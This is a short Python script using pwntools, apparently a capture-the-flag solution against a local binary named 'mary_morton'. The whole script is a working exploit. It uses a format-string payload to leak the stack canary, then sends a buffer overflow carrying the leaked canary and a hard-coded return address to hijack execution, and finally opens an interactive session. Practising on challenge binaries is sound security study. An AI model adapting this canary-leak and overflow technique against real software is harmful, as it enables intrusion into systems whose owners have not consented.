from pwn import *
p=process('./mary_morton')
p.recvuntil('3. Exit the battle')
sys=p64(0x4008de)
p.sendline('2')
form='a'+'%p'*22 + "zzzz" + "%p"
p.sendline(form)
p.recvuntil("zzzz")
canary=p64(int(p.recv(18),16))
log.info("Canary = " +  canary)
p.recvuntil('3. Exit the battle')
p.sendline('1')
exploit="a"*136+canary+"a"*8+sys
p.sendline(exploit)
p.interactive()
#gdb.attach(p)
print (p.recv())
print (p.recv())


